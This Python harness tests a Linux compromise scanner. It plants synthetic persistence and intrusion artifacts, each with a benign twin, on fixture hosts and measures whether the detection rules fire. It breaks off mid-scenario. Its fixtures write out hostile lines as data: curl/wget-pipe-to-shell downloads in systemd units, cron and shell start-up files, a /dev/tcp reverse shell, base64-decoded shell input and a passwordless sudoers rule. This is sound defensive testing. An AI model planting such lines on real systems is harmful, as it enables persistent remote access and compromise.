#!/usr/bin/env python3
"""Detection-validity harness: planted artifacts versus benign twins.

For every rule the collectors can emit, this module builds a hermetic fixture
host (its own root, home and /proc; probe commands answered from canned text),
plants one synthetic artifact of the shape the rule targets, runs a complete
scan and records whether the rule fired. A benign twin of each artifact is
planted on its own host and must stay silent. The unplanted host must reach
NO_COMPROMISE_INDICATORS_OBSERVED, otherwise no negative result below means
anything.

What this measures: recall on synthetic artifact SHAPES and false alarms on
their benign counterparts, under the scope and profile named per scenario.
What it does not measure: sensitivity to real malware, evasion by shapes not
listed here, or anything about the live host. Known gaps are listed as such,
never counted as detections.

    python3 tools/validity.py            # print the Markdown table
    python3 tools/validity.py --json     # machine-readable result
    python3 tools/validity.py --write    # refresh docs/DETECTION_VALIDITY.json
    python3 tools/validity.py --check    # exit 1 if the committed file is stale
"""
from __future__ import annotations

import argparse
import json
import sys
import tempfile
from dataclasses import dataclass
from pathlib import Path
from types import SimpleNamespace
from typing import Callable
from unittest.mock import patch

if __package__ in (None, ""):
    sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from falsicore import __version__, guide, report  # noqa: E402
from falsicore.collectors import LIVE_ONLY_COLLECTORS, Audit, _allowed_audit_invocation  # noqa: E402

ROOT = Path(__file__).resolve().parents[1]
RESULT_FILE = ROOT / "docs" / "DETECTION_VALIDITY.json"
SCHEMA = "falsicore.detection-validity.v1"
UID = 24680
USER = "fixture"
ESSENTIAL = ("processes", "network", "persistence", "browsers", "auth", "packages", "crossview")

STAT_TAIL = ("S {ppid} 1 1 0 -1 4194560 100 0 0 0 1 1 0 0 20 0 1 0 {start} 10000000 500 "
             "18446744073709551615 1 1 0 0 0 0 0 0 0 0 0 0 17 1 0 0 0 0 0 0 0 0 0 0 0 0 0")
JOURNAL_BENIGN = [
    {"MESSAGE": "New session 3 of user fixture.", "_COMM": "systemd-logind", "_SYSTEMD_UNIT": "systemd-logind.service",
     "__REALTIME_TIMESTAMP": "1730000000000000"},
    {"MESSAGE": "pam_unix(gdm-password:session): session opened for user fixture(uid=24680) by (uid=0)",
     "_COMM": "gdm-session-worker", "__REALTIME_TIMESTAMP": "1730000001000000"},
]
KERNEL_BENIGN = [{"MESSAGE": "usb 1-1: new high-speed USB device number 3 using xhci_hcd", "_COMM": "kernel",
                  "__REALTIME_TIMESTAMP": "1730000002000000"}]
SS_CLEAN = ('tcp LISTEN 0 4096 127.0.0.1:631 0.0.0.0:* users:(("cupsd",pid=800,fd=7))\n'
            'udp UNCONN 0 0 127.0.0.54:53 0.0.0.0:*\n'
            'tcp ESTAB 0 0 192.168.1.20:51000 8.8.8.8:443 users:(("chrome",pid=1300,fd=40))\n')
BASHRC_CLEAN = """# ~/.bashrc: executed by bash(1) for non-login shells.
case $- in
    *i*) ;;
      *) return;;
esac
HISTCONTROL=ignoreboth
shopt -s histappend
HISTSIZE=1000
export PATH="$HOME/.local/bin:$PATH"
# enable color support of ls (the curl | sh example in this comment is data, not code)
alias ll='ls -alF'
alias grep='grep --color=auto'
if [ -f ~/.bash_aliases ]; then
    . ~/.bash_aliases
fi
# stock Ubuntu lines: the output of two packaged programs is evaluated as code
test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"
"""
MANIFEST_BENIGN = {"manifest_version": 3, "name": "Notes", "version": "1.2.0", "permissions": ["storage"]}
MANIFEST_POWERFUL = {"manifest_version": 3, "name": "Helper", "version": "4.0.1",
                     "permissions": ["cookies", "webRequest", "tabs"], "host_permissions": ["<all_urls>"]}


class FixtureHost:
    """A root, a home and a /proc under a temporary directory, plus canned probe output."""

    def __init__(self, base: Path, scope: str = "user", profile: str = "deep", offline: bool = False) -> None:
        self.scope, self.profile, self.offline = scope, profile, offline
        self.root = base / "root"
        self.home = self.root / "home" / USER
        self.proc = self.root / "proc"
        self.outputs: dict[str, dict] = {}
        self.commands_seen: list[tuple[str, list[str]]] = []
        self.hidden_pids: set[int] = set()        # known to the kernel oracle, absent from /proc
        self.attested: set[Path] = set()           # files the package database vouches for (root-owned on a real host)
        self.lookup_only: dict[int, int] = {}      # pid -> Tgid answered by a direct lookup although unlisted
        self.ss_listeners: list[str] = []
        self.procnet_rows: dict[str, list[tuple[str, int]]] = {"tcp": [("0100007F", 631)], "udp": [("3600007F", 53)],
                                                               "tcp6": [], "udp6": []}
        self.home.mkdir(parents=True)
        self._clean_host()

    def pid_probe(self, pid: int) -> bool:
        """Stand-in for kill(pid, 0): every /proc entry and thread, plus planted hidden PIDs."""
        if pid in self.hidden_pids:
            return True
        folder = self.proc / str(pid)
        if folder.is_dir():
            return True
        for entry in self.proc.iterdir():
            if entry.name.isdigit() and (entry / "task" / str(pid)).is_dir():
                return True
        return False

    # ---- building blocks ---------------------------------------------------
    def file(self, relative: str, text: str, mode: int | None = None) -> Path:
        path = self.root / relative.lstrip("/")
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text)
        # Always explicit: the process umask is not part of the scenario
        # (safety.create_run_directory sets 0o077 process-wide in the CLI and
        # in some tests), and pacman/apk mode records are compared with disk.
        path.chmod(0o644 if mode is None else mode)
        return path

    def home_file(self, relative: str, text: str, mode: int | None = None) -> Path:
        return self.file(str(self.home.relative_to(self.root) / relative), text, mode)

    def symlink(self, relative: str, target: str) -> Path:
        path = self.root / relative.lstrip("/")
        path.parent.mkdir(parents=True, exist_ok=True)
        path.symlink_to(target)
        return path

    def process(self, pid: int, exe: str, uid: int = UID, cmdline: list[str] | None = None,
                ppid: int = 1, name: str = "proc") -> None:
        folder = self.proc / str(pid)
        folder.mkdir(parents=True, exist_ok=True)
        (folder / "status").write_text(f"Name:\t{name}\nTgid:\t{pid}\nPid:\t{pid}\nPPid:\t{ppid}\nUid:\t{uid}\t{uid}\t{uid}\t{uid}\n")
        (folder / "stat").write_text(f"{pid} ({name}) " + STAT_TAIL.format(ppid=ppid, start=1000 + pid) + "\n")
        (folder / "exe").symlink_to(exe)
        (folder / "task" / str(pid)).mkdir(parents=True, exist_ok=True)
        argv = cmdline if cmdline is not None else [exe]
        (folder / "cmdline").write_bytes(b"".join(a.encode() + b"\0" for a in argv))

    def procnet(self, tcp: list[tuple[str, int]] = (), udp: list[tuple[str, int]] = (),
                tcp6: list[tuple[str, int]] = (), udp6: list[tuple[str, int]] = ()) -> None:
        """/proc/net/{tcp,udp}{,6} with the given (hex address, port) listeners."""
        header = "  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode\n"
        for name, rows, state, zero in (("tcp", tcp, "0A", "00000000"), ("udp", udp, "07", "00000000"),
                                        ("tcp6", tcp6, "0A", "0" * 32), ("udp6", udp6, "07", "0" * 32)):
            lines = [header] + [f"{i:4d}: {addr}:{port:04X} {zero}:0000 {state} 00000000:00000000 00:00000000 00000000 0 0 {i + 1} 1 0\n"
                                for i, (addr, port) in enumerate(rows)]
            self.file(f"/proc/net/{name}", "".join(lines))

    def listen(self, proto: str, address: str, port: int, process: str = "") -> None:
        """A listening socket visible in BOTH kernel views (ss and /proc/net), as on a real host."""
        packed = {"0.0.0.0": "00000000", "127.0.0.1": "0100007F", "192.168.1.20": "1401A8C0", "[::]": "0" * 32}[address]
        state = "LISTEN" if proto == "tcp" else "UNCONN"
        suffix = f' users:(("{process}",pid=900,fd=3))' if process else ""
        self.ss_listeners.append(f"{proto} {state} 0 128 {address}:{port} {'[::]:*' if address == '[::]' else '0.0.0.0:*'}{suffix}\n")
        self.procnet_rows[proto + ("6" if address == "[::]" else "")].append((packed, port))
        self.command_output("ss", SS_CLEAN + "".join(self.ss_listeners))
        self.procnet(**self.procnet_rows)

    def command_output(self, key: str, stdout: str = "", status: str = "COMPLETED", exit_code: int | None = 0,
                       stderr: str = "") -> None:
        self.outputs[key] = {"status": status, "stdout": stdout, "stderr": stderr, "exit": exit_code,
                             "elapsed_ms": 1, "truncated": False, "error": "", "residual_killed": False}

    def journal(self, key: str, entries: list[dict]) -> None:
        self.command_output(key, "".join(json.dumps(e) + "\n" for e in entries))

    def fake_command(self, tool: str, args: list[str], timeout: float = 12, limit: int = 0) -> dict:
        """Stands in for Audit.command: same read-only policy, canned answers."""
        if not _allowed_audit_invocation(tool, args):
            raise PermissionError(f"not an approved probe: {tool} {args}")
        self.commands_seen.append((tool, list(args)))
        key = tool
        if tool == "journalctl":
            key = "journalctl:kernel" if "_TRANSPORT=kernel" in args else "journalctl:auth"
        answer = self.outputs.get(key)
        if answer is None:
            return {"status": "UNAVAILABLE", "stdout": "", "stderr": "", "exit": None, "elapsed_ms": 0,
                    "truncated": False, "error": "binary missing", "residual_killed": False}
        return dict(answer)

    # ---- the unplanted host --------------------------------------------------
    def _clean_host(self) -> None:
        self.file("/etc/os-release", 'ID=ubuntu\nVERSION_ID="24.04"\nPRETTY_NAME="Ubuntu 24.04 LTS"\n')
        self.file("/etc/passwd", f"root:x:0:0:root:/root:/bin/bash\n{USER}:x:{UID}:{UID}:Fixture:/home/{USER}:/bin/bash\n")
        # Read only when journalctl is absent or the host is an offline image without a journal directory.
        self.file("/var/log/auth.log", "Nov  1 09:00:00 host CRON[1200]: pam_unix(cron:session): session opened for user root\n")
        self.file("/etc/machine-id", "0123456789abcdef0123456789abcdef\n")
        self.file("/proc/sys/kernel/random/boot_id", "aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee\n")
        for name, value in (("yama/ptrace_scope", "1"), ("unprivileged_bpf_disabled", "2"),
                            ("kptr_restrict", "1"), ("dmesg_restrict", "1"), ("tainted", "0")):
            self.file(f"/proc/sys/kernel/{name}", value + "\n")
        self.file("/proc/modules", "xt_conntrack 12288 1 - Live 0x0000000000000000\nnft_compat 20480 2 - Live 0x0\n")
        self.file("/sys/kernel/security/lsm", "lockdown,capability,landlock,yama,apparmor")
        # Cross-view inputs of a consistent host.
        self.file("/proc/sys/kernel/pid_max", "8192\n")
        for module in ("xt_conntrack", "nft_compat"):
            self.file(f"/sys/module/{module}/initstate", "live\n")
        self.file("/sys/module/printk/parameters/time", "N\n")   # built-in: no initstate
        self.file("/proc/self/mountinfo", "22 1 0:21 / /proc rw,nosuid,nodev,noexec - proc proc rw\n"
                  "40 22 0:35 / /proc/sys/fs/binfmt_misc rw - autofs systemd-1 rw\n")
        self.procnet(tcp=[("0100007F", 631)], udp=[("3600007F", 53)])
        self.file("/usr/lib/systemd/system/ssh.service",
                  "[Unit]\nDescription=OpenBSD Secure Shell server\n[Service]\nEnvironmentFile=-/etc/default/ssh\n"
                  "ExecStartPre=/usr/sbin/sshd -t\nExecStart=/usr/sbin/sshd -D $SSHD_OPTS\nExecReload=/usr/sbin/sshd -t\n")
        self.file("/usr/lib/systemd/system/cron.service", "[Service]\nExecStart=/usr/sbin/cron -f -P\n")
        self.file("/usr/lib/systemd/system/tmp-cleanup.service",
                  "[Service]\nEnvironment=TMPDIR=/tmp\nExecStart=/usr/bin/systemd-tmpfiles --clean /tmp/cache\n")
        self.file("/usr/lib/systemd/user/at-spi-dbus-bus.service",
                  "[Service]\nExecStart=/usr/libexec/at-spi-bus-launcher --launch-immediately\n")
        self.file("/etc/cron.d/e2scrub_all",
                  "30 3 * * 0 root test -e /run/systemd/system || SERVICE_MODE=1 /usr/lib/x86_64-linux-gnu/e2fsprogs/e2scrub_all_cron\n")
        self.file("/etc/cron.daily/apt-compat", "#!/bin/sh\nset -e\n[ -x /usr/lib/apt/apt.systemd.daily ] || exit 0\n"
                  "exec /usr/lib/apt/apt.systemd.daily\n", 0o755)
        self.file("/etc/xdg/autostart/at-spi-dbus-bus.desktop",
                  "[Desktop Entry]\nType=Application\nName=AT-SPI D-Bus Bus\nExec=/usr/libexec/at-spi-bus-launcher --launch-immediately\n")
        self.file("/etc/apt/sources.list", "deb http://archive.ubuntu.com/ubuntu noble main restricted\n")
        self.file("/var/lib/dpkg/status", "Package: bash\nStatus: install ok installed\nVersion: 5.2\n\n")
        for program in ("dircolors", "lesspipe"):
            self.attested.add(self.file(f"/usr/bin/{program}", "#!/bin/sh\n", 0o755))
        self.home_file(".bashrc", BASHRC_CLEAN)
        self.home_file(".profile", 'if [ -n "$BASH_VERSION" ]; then\n    if [ -f "$HOME/.bashrc" ]; then\n'
                       '        . "$HOME/.bashrc"\n    fi\nfi\n')
        self.home_file(".bash_aliases", "alias la='ls -A'\n")
        self.home_file(".ssh/authorized_keys", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFixtureKeyFixtureKeyFixtureKey user@host\n", 0o600)
        (self.home / ".ssh").chmod(0o700)
        self.home_file(".config/autostart/nm-applet.desktop", "[Desktop Entry]\nExec=/usr/bin/nm-applet\n")
        self.home_file(".config/google-chrome/Default/Extensions/aaaabbbbccccddddeeeeffffgggghhhh/1.2.0_0/manifest.json",
                       json.dumps(MANIFEST_BENIGN))
        self.home_file(".mozilla/firefox/abcd1234.default-release/extensions.json", json.dumps({"addons": [
            {"id": "notes@example", "type": "extension", "active": True, "userPermissions": {"permissions": ["storage"], "origins": []}},
            {"id": "disabled-powerful@example", "type": "extension", "active": False, "userDisabled": True,
             "userPermissions": {"permissions": ["webRequest", "cookies"], "origins": ["<all_urls>"]}},
        ]}))
        self.home_file(".config/google-chrome/NativeMessagingHosts/com.example.pw.json",
                       json.dumps({"name": "com.example.pw", "path": "/usr/lib/example/pw-host",
                                   "allowed_origins": ["chrome-extension://aaaabbbbccccddddeeeeffffgggghhhh/"]}))
        self.process(1, "/usr/lib/systemd/systemd", uid=0, cmdline=["/sbin/init", "splash"], ppid=0, name="systemd")
        self.process(1200, "/usr/bin/bash", name="bash")
        self.process(1300, "/opt/google/chrome/chrome", cmdline=["/opt/google/chrome/chrome", "--type=renderer"], name="chrome")
        self.command_output("uname", "6.8.0-fixture\n")
        self.command_output("ss", SS_CLEAN)
        self.command_output("crontab", "", "FAILED", 1, f"no crontab for {USER}\n")
        self.journal("journalctl:auth", JOURNAL_BENIGN)
        self.journal("journalctl:kernel", KERNEL_BENIGN)
        self.command_output("aa-status", "", "COMPLETED", 0)
        self.command_output("mokutil", "SecureBoot enabled\n")
        self.command_output("dpkg", "", "COMPLETED", 0)


@dataclass
class Scenario:
    name: str
    kind: str                               # positive | benign | known_gap
    expects: frozenset[str]                 # rules that must fire (positive) / be absent (benign)
    plant: Callable[[FixtureHost], None]
    attack: str = ""
    scope: str = "user"
    notes: str = ""
    offline: bool = False
    evidence: Callable[[list[dict]], bool] | None = None   # optional check on the matching findings

    @property
    def rules(self) -> list[str]:
        return sorted(self.expects)


SCENARIOS: list[Scenario] = []


def scenario(name: str, kind: str, rules: str | tuple[str, ...], attack: str = "", scope: str = "user",
             notes: str = "", evidence: Callable[[list[dict]], bool] | None = None, offline: bool = False) -> Callable:
    expects = frozenset((rules,) if isinstance(rules, str) else rules)

    def register(fn: Callable[[FixtureHost], None]) -> Callable[[FixtureHost], None]:
        SCENARIOS.append(Scenario(name=name, kind=kind, expects=expects, plant=fn, attack=attack, scope=scope,
                                  notes=notes, evidence=evidence, offline=offline))
        return fn
    return register


# ---- processes ----------------------------------------------------------------
@scenario("process_from_tmp", "positive", "EXECUTABLE_IN_VOLATILE_PATH", "T1036")
def _(h: FixtureHost) -> None:
    h.process(4242, "/tmp/.x/payload", name="payload")


@scenario("process_from_tmp_hidden_dir_shm", "positive", "EXECUTABLE_IN_VOLATILE_PATH", "T1036")
def _(h: FixtureHost) -> None:
    h.process(4243, "/dev/shm/.cache/svc", name="svc")


@scenario("process_from_usr_bin", "benign", "EXECUTABLE_IN_VOLATILE_PATH")
def _(h: FixtureHost) -> None:
    h.process(4244, "/usr/bin/python3", cmdline=["python3", "/tmp/notes.py"], name="python3")


@scenario("deleted_running_executable", "positive", "DELETED_RUNNING_EXECUTABLE", "T1070.004")
def _(h: FixtureHost) -> None:
    h.process(4245, "/usr/lib/old-daemon (deleted)", name="old-daemon")


@scenario("root_process_from_home", "positive", "ROOT_RUNNING_USER_PATH", "T1548",
          notes="user scope cannot read a root process's exe on a live host; the shape is verified on the fixture")
def _(h: FixtureHost) -> None:
    h.process(4246, f"/home/{USER}/.local/bin/updater", uid=0, name="updater")


@scenario("root_process_from_usr", "benign", "ROOT_RUNNING_USER_PATH")
def _(h: FixtureHost) -> None:
    h.process(4247, "/usr/sbin/cron", uid=0, name="cron")


def _debug_port_listener(findings: list[dict]) -> bool:
    return any(f["evidence"].get("debug_port_listener") == "LISTENING_BEYOND_LOOPBACK" for f in findings)


@scenario("browser_remote_debugging_port_open", "positive", "UNSAFE_BROWSER_LAUNCH_FLAG", "T1185",
          evidence=_debug_port_listener)
def _(h: FixtureHost) -> None:
    h.process(4248, "/opt/google/chrome/chrome", cmdline=["/opt/google/chrome/chrome", "--remote-debugging-port=9222"], name="chrome")
    h.listen("tcp", "0.0.0.0", 9222, "chrome")


@scenario("browser_no_sandbox", "positive", "UNSAFE_BROWSER_LAUNCH_FLAG", "T1562")
def _(h: FixtureHost) -> None:
    h.process(4249, "/usr/lib/chromium/chromium", cmdline=["chromium", "--no-sandbox", "--disable-web-security"], name="chromium")


@scenario("browser_ordinary_flags", "benign", "UNSAFE_BROWSER_LAUNCH_FLAG")
def _(h: FixtureHost) -> None:
    h.process(4250, "/usr/lib/firefox/firefox", cmdline=["firefox", "-contentproc", "-isForBrowser"], name="firefox")


# ---- network --------------------------------------------------------------------
@scenario("ssh_listening_everywhere", "positive", "REMOTE_ACCESS_PORT_EXPOSED", "T1021")
def _(h: FixtureHost) -> None:
    h.listen("tcp", "0.0.0.0", 22, "sshd")


@scenario("vnc_listening_on_lan_address", "positive", "REMOTE_ACCESS_PORT_EXPOSED", "T1021.005")
def _(h: FixtureHost) -> None:
    h.listen("tcp", "192.168.1.20", 5900)


@scenario("ssh_listening_loopback_only", "benign", "REMOTE_ACCESS_PORT_EXPOSED")
def _(h: FixtureHost) -> None:
    h.listen("tcp", "127.0.0.1", 22, "sshd")


@scenario("volatile_process_with_public_connection", "positive", ("TEMP_PROCESS_PUBLIC_EGRESS", "EXECUTABLE_IN_VOLATILE_PATH"), "T1071")
def _(h: FixtureHost) -> None:
    h.process(4251, "/var/tmp/.s/agent", name="agent")
    h.command_output("ss", SS_CLEAN + 'tcp ESTAB 0 0 192.168.1.20:52000 1.1.1.1:443 users:(("agent",pid=4251,fd=5))\n')


@scenario("ordinary_process_with_public_connection", "benign", "TEMP_PROCESS_PUBLIC_EGRESS")
def _(h: FixtureHost) -> None:
    h.command_output("ss", SS_CLEAN + 'tcp ESTAB 0 0 192.168.1.20:52001 1.1.1.1:443 users:(("bash",pid=1200,fd=5))\n')


# ---- persistence: systemd ---------------------------------------------------------
@scenario("unit_symlink_into_shm", "positive", "SYSTEMD_SYMLINK_TO_TEMP", "T1543.002")
def _(h: FixtureHost) -> None:
    h.symlink("/etc/systemd/system/multi-user.target.wants/sync.service", "/dev/shm/.u/sync.service")


@scenario("unit_execstart_download_pipe", "positive", "SUSPICIOUS_SYSTEMD_EXECUTION", "T1543.002")
def _(h: FixtureHost) -> None:
    h.file("/etc/systemd/system/update-check.service",
           "[Service]\nExecStart=/bin/sh -c 'curl -fsSL http://198.51.100.9/u.sh | sh'\n")


@scenario("unit_execstart_from_tmp", "positive", "SUSPICIOUS_SYSTEMD_EXECUTION", "T1543.002")
def _(h: FixtureHost) -> None:
    h.file("/etc/systemd/system/cache.service", "[Service]\nExecStart=/tmp/.cache/daemon --quiet\n")


@scenario("user_unit_execstart_from_tmp", "positive", "SUSPICIOUS_SYSTEMD_EXECUTION", "T1543.002")
def _(h: FixtureHost) -> None:
    h.home_file(".config/systemd/user/sync.service", "[Service]\nExecStart=/var/tmp/.sync/run\n")


@scenario("unit_with_tmp_as_argument", "benign", "SUSPICIOUS_SYSTEMD_EXECUTION")
def _(h: FixtureHost) -> None:
    h.file("/etc/systemd/system/backup.service", "[Service]\nExecStart=/usr/bin/rsync -a /home /tmp/backup-stage\n")


@scenario("ld_so_preload_present", "positive", "SYSTEM_LOADER_PRELOAD", "T1574.006")
def _(h: FixtureHost) -> None:
    h.file("/etc/ld.so.preload", "/usr/local/lib/libhook.so\n")


# ---- persistence: cron -------------------------------------------------------------
@scenario("cron_d_executes_from_tmp", "positive", "SUSPICIOUS_CRON_EXECUTION", "T1053.003")
def _(h: FixtureHost) -> None:
    h.file("/etc/cron.d/maintenance", "*/5 * * * * root /tmp/.m/run >/dev/null 2>&1\n")


@scenario("cron_hourly_download_pipe", "positive", "SUSPICIOUS_CRON_EXECUTION", "T1053.003")
def _(h: FixtureHost) -> None:
    h.file("/etc/cron.hourly/update", "#!/bin/sh\nwget -qO- http://198.51.100.9/h | sh\n", 0o755)


@scenario("cron_d_ordinary_job", "benign", "SUSPICIOUS_CRON_EXECUTION")
def _(h: FixtureHost) -> None:
    h.file("/etc/cron.d/logrotate", "0 1 * * * root /usr/sbin/logrotate /etc/logrotate.conf --state /tmp/lr.state\n")


@scenario("user_crontab_reboot_from_shm", "positive", "SUSPICIOUS_USER_CRONTAB", "T1053.003")
def _(h: FixtureHost) -> None:
    h.command_output("crontab", "@reboot /dev/shm/.k/keep\n")


@scenario("user_crontab_ordinary", "benign", "SUSPICIOUS_USER_CRONTAB")
def _(h: FixtureHost) -> None:
    h.command_output("crontab", "0 9 * * 1-5 /usr/bin/python3 /home/fixture/bin/report.py\n")


# ---- persistence: shell start-up ------------------------------------------------------
@scenario("bashrc_download_pipe", "positive", "SUSPICIOUS_SHELL_INIT", "T1546.004")
def _(h: FixtureHost) -> None:
    h.home_file(".bashrc", BASHRC_CLEAN + "curl -fsSL http://198.51.100.9/i.sh | bash\n")


@scenario("bashrc_eval_of_download", "positive", "SUSPICIOUS_SHELL_INIT", "T1546.004")
def _(h: FixtureHost) -> None:
    h.home_file(".bashrc", BASHRC_CLEAN + 'eval "$(curl -s http://198.51.100.9/env)"\n')


@scenario("bashrc_prompt_command_download", "positive", "SUSPICIOUS_SHELL_INIT", "T1546.004")
def _(h: FixtureHost) -> None:
    h.home_file(".bashrc", BASHRC_CLEAN + "PROMPT_COMMAND='curl -s http://198.51.100.9/p | sh'\n")


@scenario("bashrc_reverse_shell_dev_tcp", "positive", "SUSPICIOUS_SHELL_INIT", "T1059.004")
def _(h: FixtureHost) -> None:
    h.home_file(".bashrc", BASHRC_CLEAN + "bash -i >& /dev/tcp/198.51.100.9/4444 0>&1 &\n")


@scenario("bashrc_sources_file_that_executes_from_tmp", "positive", "SUSPICIOUS_SHELL_INIT", "T1546.004")
def _(h: FixtureHost) -> None:
    h.home_file(".bash_aliases", "alias la='ls -A'\nnohup /tmp/.x/payload >/dev/null 2>&1 &\n")


@scenario("bashrc_base64_decode_into_shell", "positive", "SUSPICIOUS_SHELL_INIT", "T1027")
def _(h: FixtureHost) -> None:
    h.home_file(".profile", "echo L3RtcC8ueC9w | base64 -d | sh\n")


@scenario("zshrc_trap_download", "positive", "SUSPICIOUS_SHELL_INIT", "T1546.004")
def _(h: FixtureHost) -> None:
    h.home_file(".zshrc", "trap 'curl -s http://198.51.100.9/t | sh' EXIT\n")


@scenario("bashrc_stock_ubuntu_wrappers", "benign", "SUSPICIOUS_SHELL_INIT")
def _(h: FixtureHost) -> None:
    h.home_file(".bashrc", BASHRC_CLEAN + 'export CACHE_DIR=/tmp/cache\n[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"\n')


@scenario("bashrc_eval_of_unattested_program", "benign", "SUSPICIOUS_SHELL_INIT",
          notes="not a finding, but the file stays PARTIAL/PARSE_UNSUPPORTED: starship is not package-attested here")
def _(h: FixtureHost) -> None:
    h.file("/usr/local/bin/starship", "#!/bin/sh\n", 0o755)
    h.home_file(".bashrc", BASHRC_CLEAN + 'eval "$(starship init bash)"\n')


@scenario("bashrc_eval_of_relay_program_output", "benign", "SUSPICIOUS_SHELL_INIT",
          notes="cat relays its input: attestation of cat proves nothing, the file stays PARTIAL")
def _(h: FixtureHost) -> None:
    h.attested.add(h.file("/usr/bin/cat", "#!/bin/sh\n", 0o755))
    h.home_file(".bashrc", BASHRC_CLEAN + 'eval "$(cat ~/.hook)"\n')


@scenario("bashrc_download_only_in_comment", "benign", "SUSPICIOUS_SHELL_INIT")
def _(h: FixtureHost) -> None:
    h.home_file(".bashrc", BASHRC_CLEAN + "# never do: curl http://x | sh\n")


@scenario("bashrc_relative_exec_after_cd", "known_gap", "SUSPICIOUS_SHELL_INIT",
          notes="relative program after cd: no dataflow between commands")
def _(h: FixtureHost) -> None:
    h.home_file(".bashrc", BASHRC_CLEAN + "cd /tmp/.x && ./payload\n")


@scenario("bashrc_download_via_variable", "known_gap", "SUSPICIOUS_SHELL_INIT",
          notes="download bound to a variable first; reported as EXPANSION_NOT_RESOLVED only")
def _(h: FixtureHost) -> None:
    h.home_file(".bashrc", BASHRC_CLEAN + 'x=$(curl -s http://198.51.100.9/i); eval "$x"\n')


# ---- persistence: autostart, ssh, sudo --------------------------------------------------
@scenario("autostart_exec_from_tmp", "positive", "SUSPICIOUS_AUTOSTART", "T1547.013")
def _(h: FixtureHost) -> None:
    h.home_file(".config/autostart/helper.desktop", "[Desktop Entry]\nType=Application\nExec=/tmp/.h/helper --daemon\n")


@scenario("autostart_ordinary", "benign", "SUSPICIOUS_AUTOSTART")
def _(h: FixtureHost) -> None:
    h.home_file(".config/autostart/sync.desktop", "[Desktop Entry]\nType=Application\nExec=/usr/bin/nextcloud --background\n")


@scenario("authorized_keys_world_readable", "positive", "SSH_AUTHORIZED_KEYS_PERMISSIONS", "T1098.004")
def _(h: FixtureHost) -> None:
    (h.home / ".ssh/authorized_keys").chmod(0o644)


@scenario("ssh_directory_group_accessible", "positive", "SSH_DIRECTORY_OVERPERMISSIVE", "T1098.004")
def _(h: FixtureHost) -> None:
    (h.home / ".ssh").chmod(0o750)


@scenario("sudoers_nopasswd", "positive", "SUDO_NOPASSWD_RULE", "T1548.003", scope="system")
def _(h: FixtureHost) -> None:
    h.file("/etc/sudoers.d/90-ops", f"{USER} ALL=(ALL) NOPASSWD: ALL\n", 0o440)


@scenario("sudoers_with_password", "benign", "SUDO_NOPASSWD_RULE", scope="system")
def _(h: FixtureHost) -> None:
    h.file("/etc/sudoers.d/90-ops", f"{USER} ALL=(ALL) ALL\n", 0o440)


# ---- browsers ----------------------------------------------------------------------------
@scenario("chrome_extension_powerful", "positive", "POWERFUL_BROWSER_EXTENSION", "T1176.001")
def _(h: FixtureHost) -> None:
    h.home_file(".config/google-chrome/Default/Extensions/ppppqqqqrrrrssssttttuuuuvvvvwwww/4.0.1_0/manifest.json",
                json.dumps(MANIFEST_POWERFUL))


@scenario("chrome_extension_powerful_but_disabled", "benign", "POWERFUL_BROWSER_EXTENSION")
def _(h: FixtureHost) -> None:
    ext = "ppppqqqqrrrrssssttttuuuuvvvvwwww"
    h.home_file(f".config/google-chrome/Default/Extensions/{ext}/4.0.1_0/manifest.json", json.dumps(MANIFEST_POWERFUL))
    h.home_file(".config/google-chrome/Default/Preferences",
                json.dumps({"extensions": {"settings": {ext: {"disable_reasons": [1], "location": 1}}}}))


@scenario("chrome_extension_corrupt_manifest", "positive", "INVALID_EXTENSION_MANIFEST", "T1176.001")
def _(h: FixtureHost) -> None:
    h.home_file(".config/chromium/Default/Extensions/zzzzyyyyxxxxwwwwvvvvuuuuttttssss/1.0_0/manifest.json", "{not json")


@scenario("firefox_addon_powerful_active", "positive", "POWERFUL_FIREFOX_EXTENSION", "T1176.001")
def _(h: FixtureHost) -> None:
    h.home_file(".mozilla/firefox/abcd1234.default-release/extensions.json", json.dumps({"addons": [
        {"id": "grabber@example", "type": "extension", "active": True, "signedState": 2,
         "userPermissions": {"permissions": ["webRequest", "cookies"], "origins": ["<all_urls>"]}}]}))


@scenario("native_host_in_home", "positive", "NATIVE_HOST_OUTSIDE_STANDARD_PATH", "T1176.001")
def _(h: FixtureHost) -> None:
    h.home_file(".config/google-chrome/NativeMessagingHosts/com.example.bridge.json",
                json.dumps({"name": "com.example.bridge", "path": f"/home/{USER}/.local/share/bridge",
                            "allowed_origins": ["chrome-extension://ppppqqqqrrrrssssttttuuuuvvvvwwww/"]}))


@scenario("native_host_in_usr_lib", "benign", "NATIVE_HOST_OUTSIDE_STANDARD_PATH")
def _(h: FixtureHost) -> None:
    h.home_file(".mozilla/native-messaging-hosts/org.kde.plasma.browser_integration.json",
                json.dumps({"name": "org.kde.plasma.browser_integration", "path": "/usr/bin/plasma-browser-integration-host",
                            "allowed_extensions": ["plasma-browser-integration@kde.org"]}))


@scenario("browser_force_install_policy", "positive", "BROWSER_ENTERPRISE_POLICY", "T1176.001")
def _(h: FixtureHost) -> None:
    h.file("/etc/opt/chrome/policies/managed/ext.json", json.dumps({"ExtensionInstallForcelist": ["ppppqqqqrrrrssssttttuuuuvvvvwwww"]}))


@scenario("browser_policy_without_extensions", "benign", "BROWSER_ENTERPRISE_POLICY")
def _(h: FixtureHost) -> None:
    h.file("/etc/opt/chrome/policies/managed/homepage.json", json.dumps({"HomepageLocation": "https://intranet.example"}))


# ---- auth -------------------------------------------------------------------------------------
@scenario("ssh_login_accepted", "positive", "REMOTE_AUTHENTICATION_REVIEW", "T1078")
def _(h: FixtureHost) -> None:
    h.journal("journalctl:auth", JOURNAL_BENIGN + [
        {"MESSAGE": "Accepted publickey for fixture from 198.51.100.23 port 51022 ssh2: ED25519 SHA256:abc",
         "_COMM": "sshd", "__REALTIME_TIMESTAMP": "1730000005000000"}])


@scenario("ssh_login_failed_only", "benign", "REMOTE_AUTHENTICATION_REVIEW")
def _(h: FixtureHost) -> None:
    h.journal("journalctl:auth", JOURNAL_BENIGN + [
